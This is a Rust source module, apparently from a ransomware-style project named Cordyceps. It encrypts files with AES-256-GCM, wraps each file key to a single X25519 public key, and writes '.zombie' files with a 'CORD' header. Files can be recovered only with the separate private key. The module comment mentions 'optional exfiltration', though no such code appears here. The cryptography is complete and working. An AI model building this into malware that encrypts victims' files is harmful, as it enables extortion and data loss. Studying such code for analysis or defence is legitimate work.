//! Cryptographic operations for file encryption and decryption.
//!
//! This module contains the core logic for encrypting and decrypting files,
//! as used by the CLI interface. It defines the encryption and decryption
//! routines, and is responsible for handling cryptographic workflows,
//! such as file processing, key usage, and optional exfiltration.

use std::{
    fs::{File, read_to_string},
    io::{self, Read, Write},
    path::{Path, PathBuf},
};

use aes_gcm::{
    Aes256Gcm,
    aead::{Aead, KeyInit, Nonce},
};
use base64::{Engine, engine::general_purpose::STANDARD_NO_PAD};
use hkdf::Hkdf;
use log::{debug, info};
use rand::{RngCore, rngs::OsRng};
use x25519_dalek::{EphemeralSecret, PublicKey, StaticSecret};

use crate::error::CryptoError;

/// Encrypted files extension.
pub const EXTENSION: &str = "zombie";

/// Magic bytes to identify Cordyceps encrypted files
const MAGIC_BYTES: &[u8; 4] = b"CORD";

/// .zombie file format version
const FILE_FORMAT_VERSION: u8 = 0x01;

/// Check `docs/zombie_header.md` for more information on this header
struct ZombieHeader {
    ephemeral_public_key: PublicKey,
    encrypted_file_aes_key_with_tag: [u8; 48],
    key_enc_aes_nonce: Nonce<Aes256Gcm>,
    file_aes_nonce: Nonce<Aes256Gcm>,
}

impl ZombieHeader {
    /// Total header size in bytes
    const HEADER_SIZE: usize = 4 + 1 + 32 + 48 + 12 + 12; // magic + version + pubkey + encrypted_key + nonces

    /// Writes the header to any stream that implements `io::Write`.
    fn write_to<W: Write>(&self, mut writer: W) -> Result<(), io::Error> {
        // Pre-allocate single buffer for entire header to reduce system calls
        let mut header_buf = Vec::with_capacity(Self::HEADER_SIZE);
        header_buf.extend_from_slice(MAGIC_BYTES);
        header_buf.push(FILE_FORMAT_VERSION);
        header_buf.extend_from_slice(self.ephemeral_public_key.as_bytes());
        header_buf.extend_from_slice(&self.encrypted_file_aes_key_with_tag);
        header_buf.extend_from_slice(self.key_enc_aes_nonce.as_slice());
        header_buf.extend_from_slice(self.file_aes_nonce.as_slice());

        writer.write_all(&header_buf)
    }

    /// Reads a header from any stream that implements `io::Read`.
    fn from_reader<R: Read>(mut reader: R) -> Result<Self, CryptoError> {
        // Single read operation for entire header to reduce system calls
        let mut header_buf = [0u8; Self::HEADER_SIZE];
        reader
            .read_exact(&mut header_buf)
            .map_err(|e| CryptoError::InvalidFileFormat(format!("Failed to read header: {}", e)))?;

        // Parse header from buffer
        let mut offset = 0;

        // Check magic bytes
        let magic_read = &header_buf[offset..offset + 4];
        if magic_read != MAGIC_BYTES {
            return Err(CryptoError::InvalidFileFormat(
                "Invalid magic bytes".to_string(),
            ));
        }
        offset += 4;

        // Check version
        let version_read = header_buf[offset];
        if version_read != FILE_FORMAT_VERSION {
            return Err(CryptoError::InvalidFileFormat(
                "Unsupported version".to_string(),
            ));
        }
        offset += 1;

        // Extract ephemeral public key
        let ephemeral_public_key_bytes: [u8; 32] = header_buf[offset..offset + 32]
            .try_into()
            .expect("slice length matches array size");
        offset += 32;

        // Extract encrypted AES key
        let encrypted_file_aes_key_with_tag: [u8; 48] = header_buf[offset..offset + 48]
            .try_into()
            .expect("slice length matches array size");
        offset += 48;

        // Extract key encapsulation nonce
        let key_enc_aes_nonce_bytes: [u8; 12] = header_buf[offset..offset + 12]
            .try_into()
            .expect("slice length matches array size");
        offset += 12;

        // Extract file AES nonce
        let file_aes_nonce_bytes: [u8; 12] = header_buf[offset..offset + 12]
            .try_into()
            .expect("slice length matches array size");

        Ok(Self {
            ephemeral_public_key: PublicKey::from(ephemeral_public_key_bytes),
            encrypted_file_aes_key_with_tag,
            key_enc_aes_nonce: *Nonce::<Aes256Gcm>::from_slice(&key_enc_aes_nonce_bytes),
            file_aes_nonce: *Nonce::<Aes256Gcm>::from_slice(&file_aes_nonce_bytes),
        })
    }
}

/// Encrypts a file using a 256-bit AES-GCM key for content and an ECIES-like
/// scheme for AES key encapsulation using Curve25519 (via x25519-dalek).
///
/// The encrypted file will have a `.zombie` extension and its header will
/// include:
/// - Magic bytes--`CORD`
/// - File format version
/// - Ephemeral public key--generated during encryption
/// - Encrypted AES key + GCM tag--encrypted with AES-GCM with a derived key
///   from ECDH
/// - AES nonce for key encapsulation
/// - AES nonce for file content encryption
///
/// Note: GCM tags are concatenated with their respective ciphertexts
/// by `aes_gcm`.
///
/// # Arguments
/// - `path`: The path of the file to be encrypted.
/// - `public_key`: The main public key in x25519_dalek::PublicKey type.
///
/// # Returns
/// A `Result` containing the path to the newly created `.zombie` file on
/// success, or a `CryptoError` if encryption fails.
///
/// # TODO
/// 1. Add streaming for file I/O to avoid loading the entire file into memory.
///    This might require changing the symmetric encryption algorithm.
/// 2. Split this function into crypto logic and I/O for test-friendly.
pub fn encrypt(path: &Path, public_key: &PublicKey) -> Result<PathBuf, CryptoError> {
    info!("Starting encryption for file: {:?}", path);

    // 1. Read file content
    let mut file = File::open(path)?;
    let file_size =
        usize::try_from(file.metadata()?.len()).map_err(|_| CryptoError::FileTooLarge)?;
    let mut plaintext = Vec::with_capacity(file_size);
    file.read_to_end(&mut plaintext)?;
    debug!("Read {} bytes from {:?}", plaintext.len(), path);

    // 2. Generate random data for encryption (AES key and nonces)
    let mut random_bytes = [0u8; 56]; // 32 bytes key + 12 bytes nonce + 12 bytes key-enc nonce
    OsRng.try_fill_bytes(&mut random_bytes)?;

    let file_aes_key_bytes: [u8; 32] = random_bytes[..32].try_into().unwrap();
    let file_aes_nonce_bytes: [u8; 12] = random_bytes[32..44].try_into().unwrap();
    let key_enc_aes_nonce_bytes: [u8; 12] = random_bytes[44..].try_into().unwrap();

    let file_aes_key = aes_gcm::Key::<Aes256Gcm>::from_slice(&file_aes_key_bytes);
    let cipher_file_aes_gcm = Aes256Gcm::new(file_aes_key);
    let file_aes_nonce = Nonce::<Aes256Gcm>::from_slice(&file_aes_nonce_bytes);

    debug!("Generated AES key and nonce for file content");

    // 3. Encrypt file content with AES-GCM
    let ciphertext_with_tag = cipher_file_aes_gcm
        .encrypt(file_aes_nonce, plaintext.as_ref())
        // map_err is used to convert the error type, as aes_gcm::aead::Error
        // does not implement the std::error::Error trait needed by thiserror.
        .map_err(|e| CryptoError::Encryption(format!("File content encryption failed: {:?}", e)))?;

    debug!(
        "File content encrypted. Combined ciphertext+tag size: {}",
        ciphertext_with_tag.len()
    );

    // 4. ECIES-like key encapsulation for the AES key
    let ephemeral_private = EphemeralSecret::random_from_rng(OsRng);
    let ephemeral_public = PublicKey::from(&ephemeral_private);
    debug!("Generated ephemeral Curve25519 key pair");

    let shared_secret = ephemeral_private.diffie_hellman(public_key);
    debug!("Derived shared secret using ECDH");

    // Use HKDF to derive an AES key for encrypting the file_aes_key
    let hkdf = Hkdf::<sha2::Sha256>::new(None, shared_secret.as_bytes());
    let mut key_enc_aes_key_derived_bytes = [0u8; 32];
    hkdf.expand(
        b"key_encapsulation_aes_key_derivation",
        &mut key_enc_aes_key_derived_bytes,
    )
    .map_err(|_| CryptoError::KdfError)?;
    let key_enc_aes_key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key_enc_aes_key_derived_bytes);
    let cipher_key_enc_aes_gcm = Aes256Gcm::new(key_enc_aes_key);

    let key_enc_aes_nonce = Nonce::<Aes256Gcm>::from_slice(&key_enc_aes_nonce_bytes);

    debug!("Derived AES key and nonce for key encapsulation");

    // Encrypt the file_aes_key_bytes with the derived AES key
    let encrypted_file_aes_key_with_tag_vec = cipher_key_enc_aes_gcm
        .encrypt(key_enc_aes_nonce, file_aes_key_bytes.as_ref())
        .map_err(|e| CryptoError::Encryption(format!("AES key encryption failed: {:?}", e)))?;

    debug!("AES key encrypted");

    let encrypted_file_aes_key_with_tag: [u8; 48] = encrypted_file_aes_key_with_tag_vec
        .try_into()
        .expect("AES-GCM always produces 48 bytes for 32-byte input");

    // 5. .zombie file creation and opening for writing
    let mut zombie_path = path.to_path_buf();
    zombie_path.as_mut_os_string().push(".");
    zombie_path.as_mut_os_string().push(EXTENSION);

    info!("Creating encrypted file: {:?}", zombie_path);
    let mut output_file = File::create(&zombie_path)?;

    // 6. Write the header to the .zombie file
    let header = ZombieHeader {
        ephemeral_public_key: ephemeral_public,
        encrypted_file_aes_key_with_tag,
        key_enc_aes_nonce: *key_enc_aes_nonce,
        file_aes_nonce: *file_aes_nonce,
    };
    header.write_to(&mut output_file)?;

    debug!("Wrote encrypted file header");

    // 7. Write the content ciphertext (with tag)
    output_file.write_all(&ciphertext_with_tag)?;

    debug!("File content written to encrypted file");
    Ok(zombie_path)
}

/// Decrypts a `.zombie` file.
/// Requires the corresponding private key to the main public key used
/// during encryption.
///
/// The function reads the header from the `.zombie` file to extract:
/// - Ephemeral public key
/// - Encrypted AES key + GCM tag (file content)
/// - AES nonce for key encapsulation
/// - AES nonce for file content encryption
///
///   Note: GCM tags are concatenated with their respective ciphertexts
///   by `aes_gcm`.
///
/// # Arguments:
/// - `path`: A reference to the path of the `.zombie` file to be decrypted.
/// - `private_key`: The private key to decrypt files in
///   `x25519_dalek::StaticSecret` format.
///
/// # Returns
/// A `Result` containing the path to the newly created decrypted file on
/// success, or a `CryptoError` if decryption fails.
///
/// # TODO
/// 1. Similarly to `encryption`, this function should also add streaming for file I/O
///    to avoid loading the entire file into memory.
/// /// 2. Split this function into crypto logic and I/O for test-friendly.
pub fn decrypt(path: &Path, private_key: &StaticSecret) -> Result<PathBuf, CryptoError> {
    info!("Starting decryption for file: {:?}", path);

    // 1. Read the .zombie file and parse the header
    let mut encrypted_file = File::open(path)?;
    let header = ZombieHeader::from_reader(&mut encrypted_file)?;
    debug!("Parsed .zombie header from {:?}", path);

    // 2. Read the rest of the file (ciphertext) with pre-allocated capacity
    let file_size =
        usize::try_from(encrypted_file.metadata()?.len()).map_err(|_| CryptoError::FileTooLarge)?;
    let remaining_size = file_size.saturating_sub(ZombieHeader::HEADER_SIZE);
    let mut file_content_ciphertext_with_tag = Vec::with_capacity(remaining_size);
    encrypted_file.read_to_end(&mut file_content_ciphertext_with_tag)?;
    debug!(
        "Read ciphertext+tag. Size: {}",
        file_content_ciphertext_with_tag.len()
    );

    // 3. ECIES-like decapsulation for the AES key
    let shared_secret = private_key.diffie_hellman(&header.ephemeral_public_key);
    debug!("Derived shared secret with ECDH");

    let hkdf = Hkdf::<sha2::Sha256>::new(None, shared_secret.as_bytes());
    let mut key_enc_aes_key_derived_bytes = [0u8; 32];
    hkdf.expand(
        b"key_encapsulation_aes_key_derivation",
        &mut key_enc_aes_key_derived_bytes,
    )
    .map_err(|_| CryptoError::KdfError)?;
    let key_enc_aes_key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key_enc_aes_key_derived_bytes);
    let cipher_key_enc_aes_gcm = Aes256Gcm::new(key_enc_aes_key);

    debug!("Derived AES key for key encapsulation decryption");

    let file_aes_key_bytes = cipher_key_enc_aes_gcm
        .decrypt(
            &header.key_enc_aes_nonce,
            header.encrypted_file_aes_key_with_tag.as_ref(),
        )
        .map_err(|e| {
            if e == aes_gcm::aead::Error {
                CryptoError::AuthenticationTag
            } else {
                CryptoError::Decryption(format!("AES key decryption failed: {:?}", e))
            }
        })?;
    let file_aes_key = aes_gcm::Key::<Aes256Gcm>::from_slice(&file_aes_key_bytes);
    let cipher_file_aes_gcm = Aes256Gcm::new(file_aes_key);
    debug!("AES key decrypted");

    // 4. Decrypt file content (ciphertext) with AES
    let plaintext = cipher_file_aes_gcm
        .decrypt(
            &header.file_aes_nonce,
            file_content_ciphertext_with_tag.as_ref(),
        )
        .map_err(|e| {
            if e == aes_gcm::aead::Error {
                CryptoError::AuthenticationTag
            } else {
                CryptoError::Decryption(format!("File content decryption failed: {:?}", e))
            }
        })?;
    debug!(
        "File content decrypted. Plaintext size: {}",
        plaintext.len()
    );

    // 5. Construct the decrypted file path
    let mut decrypted_path = path.to_path_buf();
    decrypted_path.set_extension("");
    info!("Creating decrypted file: {:?}", decrypted_path);

    // 6. Write decrypted content to the new file
    let mut output_file = File::create(&decrypted_path)?;
    output_file.write_all(&plaintext)?;
    info!("Decrypted content written to file");

    Ok(decrypted_path)
}

/// Generates a new 32-byte (256-bit) Curve25519 key pair.
///
/// Both the private and public keys are Base64-encoded for easier storage and
/// sharing.
///
/// # Returns
/// A `Result` with a `(StaticSecret, PublicKey)` tuple on success or a
/// `CryptoError` if key generation fails.
pub fn generate_keypair() -> Result<(StaticSecret, PublicKey), CryptoError> {
    info!("Generating new main key pair");

    let private_key = StaticSecret::random_from_rng(OsRng);
    let public_key: PublicKey = (&private_key).into();

    Ok((private_key, public_key))
}

/// Encodes a byte slice into a Base64 string.
///
/// This function takes a byte slice and encodes it into a standard Base64
/// string using the `STANDARD_NO_PAD` engine. This is a common choice for
/// cryptographic keys or hashes as it omits the trailing padding characters
///  (`=`).
///
/// # Arguments
/// - `key_bytes`: The byte slice (`&[u8]`) to be encoded.
///
/// # Returns
/// A `String` containing the Base64-encoded representation of the input bytes.
pub fn b64_encode(key_bytes: &[u8]) -> String {
    STANDARD_NO_PAD.encode(key_bytes)
}

/// Decodes a Base64 string into a byte vector.
///
/// This function decodes a Base64 string using the `STANDARD_NO_PAD` engine,
/// which does not handle padding. It returns a `CryptoError` if the input
/// string contains invalid Base64 characters.
///
/// The function assures to return a fixed-length array of 32 bytes because its
/// the expected input for the encryption function.
///
/// # Arguments
/// - `key_b64`: The Base64-encoded string slice (`&str`) to be decoded.
///
/// # Returns
/// A `Result` containing the decoded bytes ([u8; 32]) on success or a
/// `CryptoError` if the decoding fails.
pub fn b64_decode(key_b64: &str) -> Result<[u8; 32], CryptoError> {
    let decoded_vec = STANDARD_NO_PAD.decode(key_b64)?;

    if decoded_vec.len() != 32 {
        return Err(CryptoError::InvalidKeyLength);
    }

    let fixed_array: [u8; 32] = decoded_vec
        .try_into()
        .map_err(|_| CryptoError::InvalidKeyLength)?;
    Ok(fixed_array)
}

/// Loads a Base64-encoded private key from a file and returns a
/// `StaticSecret`.
///
/// Reads the file at the given path, decodes its Base64 contents, and converts
/// the result into a 32-byte `StaticSecret` used for cryptographic operations.
///
/// # Arguments
/// - `path`: Path to the Base64-encoded private key file.
///
/// # Returns
/// A `Result` containing the `StaticSecret` on success, or a `CryptoError` if
/// the file cannot be read, decoding fails, or the key is not 32 bytes long.
///
/// # TODO
/// 1. Split this function into crypto logic and I/O for test-friendly.
/// 2. Use generics for one function be able to deal with public and private
///    keys, like `pub fn load_key<K>(path: &Path) -> Result<K, CryptoError>`.
pub fn load_private_key(key: &Path) -> Result<StaticSecret, CryptoError> {
    let key_b64 = read_to_string(key)?;
    let key_bytes = b64_decode(key_b64.trim())?;
    Ok(StaticSecret::from(key_bytes))
}

/// Loads a Base64-encoded public key from a file and returns a `PublicKey`.
///
/// Reads the file at the given path, decodes its Base64 contents, and converts
/// the result into a 32-byte `PublicKey` used for cryptographic operations.
///
/// # Arguments
/// - `path`: Path to the Base64-encoded public key file.
///
/// # Returns
/// A `Result` containing the `PublicKey` on success, or a `CryptoError` if
/// the file cannot be read, decoding fails, or the key is not 32 bytes long.
///
/// # TODO
/// 1. Split this function into crypto logic and I/O for test-friendly.
/// 2. Use generics for one function be able to deal with public and private
///    keys, like `pub fn load_key<K>(path: &Path) -> Result<K, CryptoError>`.
pub fn load_public_key(key: &Path) -> Result<PublicKey, CryptoError> {
    let key_b64 = read_to_string(key)?;
    let key_bytes = b64_decode(key_b64.trim())?;
    Ok(PublicKey::from(key_bytes))
}
